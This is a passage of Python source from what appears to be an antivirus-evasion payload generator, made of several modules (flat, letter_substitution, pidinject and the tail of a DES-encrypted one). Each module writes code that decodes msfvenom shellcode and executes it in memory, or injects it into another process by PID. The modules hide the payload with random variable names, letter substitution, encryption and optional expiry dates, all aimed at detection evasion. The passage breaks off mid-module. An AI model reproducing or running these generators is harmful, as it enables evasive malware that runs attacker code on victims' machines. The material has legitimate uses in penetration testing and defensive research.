                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += '\t' + RandDESKey + ' = \'' + DESKey + '\'\n'
                PayloadCode += '\t' + RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
                PayloadCode += '\t' + RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = ' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\')\n'
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)
        
                return PayloadCode


########NEW FILE########
__FILENAME__ = flat
"""

Inline shellcode injection.

Uses VirtualAlloc() to allocate space for shellcode, RtlMoveMemory() to 
copy the shellcode in, then calls CreateThread() to invoke.

Inspiration from http://www.debasish.in/2012/04/execute-shellcode-using-python.html

 - or - 

Very basic void pointer reference, similar to the c payload


module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "No obfuscation, basic injection of shellcode through virtualalloc or void pointer reference."
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"

        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, or Heap"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
        
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                HeapVar = helpers.randomString()
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                HeapVar = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
        
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += RandReverseShell + ' = \"' + Shellcode + '\"\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandReverseShell + ' = \"' + Shellcode + '\"\n'
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode


########NEW FILE########
__FILENAME__ = letter_substitution
"""

Currently, this code takes normal shellcode, and replaces the a hex character with a random non hex letter.  At runtime,
the executables reverses the letter substitution and executes the shellcode


Letter substitution code was adapted from:
http://www.tutorialspoint.com/python/string_maketrans.htm


module by @christruncer
contributed to by @EdvardHolst

"""


import string, random
from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "A letter used in shellcode is replaced with a different letter. At runtime, the exe reverses the letter substitution and executes the shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Heap, or Void"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
    
    def generate(self):
        #Random letter substition variables
        hex_letters = "abcdef"
        non_hex_letters = "ghijklmnopqrstuvwxyz"
        encode_with_this = random.choice(hex_letters)
        decode_with_this = random.choice(non_hex_letters)

        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate()

        # Generate Random Variable Names
        subbed_shellcode_variable_name = helpers.randomString()
        shellcode_variable_name = helpers.randomString()
        rand_ptr = helpers.randomString()
        rand_buf = helpers.randomString()
        rand_ht = helpers.randomString()
        rand_decoded_letter = helpers.randomString()
        rand_correct_letter = helpers.randomString()
        rand_sub_scheme = helpers.randomString()

        # Create Letter Substitution Scheme
        sub_scheme = string.maketrans(encode_with_this, decode_with_this)

        # Escaping Shellcode
        Shellcode = Shellcode.encode("string_escape")

        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Create Payload File
                payload_code = 'import ctypes\n'
                payload_code += 'from string import maketrans\n'
                payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += rand_ptr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + shellcode_variable_name + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                payload_code += rand_buf + ' = (ctypes.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + rand_ptr + '),' + rand_buf + ',ctypes.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += rand_ht + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + rand_ptr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                payload_code += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + rand_ht + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)
            
                return payload_code

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Extra Variables
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                # Create Payload File
                payload_code = 'import ctypes\n'
                payload_code += 'from string import maketrans\n'
                payload_code += 'from datetime import datetime\n'
                payload_code += 'from datetime import date\n\n'
                payload_code += RandToday + ' = datetime.now()\n'
                payload_code += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                payload_code += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                payload_code += '\t' + rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += '\t' + rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += '\t' + rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += '\t' + shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += '\t' + rand_ptr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + shellcode_variable_name + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                payload_code += '\t' + rand_buf + ' = (ctypes.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + rand_ptr + '),' + rand_buf + ',ctypes.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += '\t' + rand_ht + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + rand_ptr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                payload_code += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + rand_ht + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)
            
                return payload_code

        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":

                HeapVar = helpers.randomString()

                # Create Payload File
                payload_code = 'import ctypes\n'
                payload_code += 'from string import maketrans\n'
                payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + shellcode_variable_name + ') * 2),ctypes.c_int(0))\n'
                payload_code += rand_ptr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + shellcode_variable_name + ')))\n'
                payload_code += rand_buf + ' = (ctypes.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + rand_ptr + '),' + rand_buf + ',ctypes.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += rand_ht + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + rand_ptr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                payload_code += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + rand_ht + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    payload_code = crypters.pyherion(payload_code)
            
                return payload_code

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Extra Variables
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()

                # Create Payload File
                payload_code = 'import ctypes\n'
                payload_code += 'from string import maketrans\n'
                payload_code += 'from datetime import datetime\n'
                payload_code += 'from datetime import date\n\n'
                payload_code += RandToday + ' = datetime.now()\n'
                payload_code += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                payload_code += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                payload_code += '\t' + rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += '\t' + rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += '\t' + rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += '\t' + shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += '\t' + shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + shellcode_variable_name + ') * 2),ctypes.c_int(0))\n'
                payload_code += '\t' + rand_ptr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + shellcode_variable_name + ')))\n'
                payload_code += '\t' + rand_buf + ' = (ctypes.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + rand_ptr + '),' + rand_buf + ',ctypes.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += '\t' + rand_ht + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + rand_ptr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                payload_code += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + rand_ht + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    payload_code = crypters.pyherion(payload_code)
            
                return payload_code

        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                #Additional random variable names
                rand_reverse_shell = helpers.randomString()
                rand_memory_shell = helpers.randomString()
                rand_shellcode = helpers.randomString()

                # Create Payload File
                payload_code = 'from ctypes import *\n'
                payload_code += 'from string import maketrans\n'
                payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.decode(\"string_escape\")\n'
                payload_code += rand_memory_shell + ' = create_string_buffer(' + subbed_shellcode_variable_name + ', len(' + subbed_shellcode_variable_name + '))\n'
                payload_code += rand_shellcode + ' = cast(' + rand_memory_shell + ', CFUNCTYPE(c_void_p))\n'
                payload_code += rand_shellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Extra Variables
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                #Additional random variable names
                rand_reverse_shell = helpers.randomString()
                rand_memory_shell = helpers.randomString()
                rand_shellcode = helpers.randomString()

                # Create Payload File
                payload_code = 'from ctypes import *\n'
                payload_code += 'from string import maketrans\n'
                payload_code += 'from datetime import datetime\n'
                payload_code += 'from datetime import date\n\n'
                payload_code += RandToday + ' = datetime.now()\n'
                payload_code += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                payload_code += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                payload_code += '\t' + rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += '\t' + rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += '\t' + rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.decode(\"string_escape\")\n'
                payload_code += '\t' + rand_memory_shell + ' = create_string_buffer(' + subbed_shellcode_variable_name + ', len(' + subbed_shellcode_variable_name + '))\n'
                payload_code += '\t' + rand_shellcode + ' = cast(' + rand_memory_shell + ', CFUNCTYPE(c_void_p))\n'
                payload_code += '\t' + rand_shellcode + '()'


                if self.required_options["use_pyherion"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code


########NEW FILE########
__FILENAME__ = pidinject
"""

Payload which injects shellcode into another process (similar to metasploit migrate functionality)

This obviously assumes you have the ability to write into the different process

Help with the injection code came from here - http://noobys-journey.blogspot.com/2010/11/injecting-shellcode-into-xpvista7.html

module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "Payload which injects and executes shellcode into the memory of a process you specify."
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"

        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "pid_number" : ["1234", "PID # to inject"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
        
    def generate(self):
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                pid_num_variable = helpers.randomString()
                pagerwx_variable = helpers.randomString()
                processall_variable = helpers.randomString()
                memcommit_variable = helpers.randomString()
                shell_length_variable = helpers.randomString()
                memalloc_variable = helpers.randomString()
                prochandle_variable = helpers.randomString()
                kernel32_variable = helpers.randomString()

                # Create Payload code
                PayloadCode = 'from ctypes import *\n\n'
                PayloadCode += pagerwx_variable + ' = 0x40\n'
                PayloadCode += processall_variable + ' = 0x1F0FFF\n'
                PayloadCode += memcommit_variable + ' = 0x00001000\n'
                PayloadCode += kernel32_variable + ' = windll.kernel32\n'
                PayloadCode += ShellcodeVariableName + ' = \"' + Shellcode + '\"\n'
                PayloadCode += pid_num_variable + ' = ' + self.required_options["pid_number"][0] +'\n'
                PayloadCode += shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n\n'
                PayloadCode += prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
                PayloadCode += memalloc_variable + ' = ' + kernel32_variable + '.VirtualAllocEx(' + prochandle_variable + ', 0, ' + shell_length_variable + ', ' + memcommit_variable + ', ' + pagerwx_variable + ')\n'
                PayloadCode += kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
                PayloadCode += kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                pid_num_variable = helpers.randomString()
                pagerwx_variable = helpers.randomString()
                processall_variable = helpers.randomString()
                memcommit_variable = helpers.randomString()
                shell_length_variable = helpers.randomString()
                memalloc_variable = helpers.randomString()
                prochandle_variable = helpers.randomString()
                kernel32_variable = helpers.randomString()

                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += pagerwx_variable + ' = 0x40\n'
                PayloadCode += processall_variable + ' = 0x1F0FFF\n'
                PayloadCode += memcommit_variable + ' = 0x00001000\n'
                PayloadCode += kernel32_variable + ' = windll.kernel32\n'
                PayloadCode += ShellcodeVariableName + ' = \"' + Shellcode + '\"\n'
                PayloadCode += pid_num_variable + ' = ' + self.required_options["pid_number"][0] +'\n'
                PayloadCode += shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n\n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
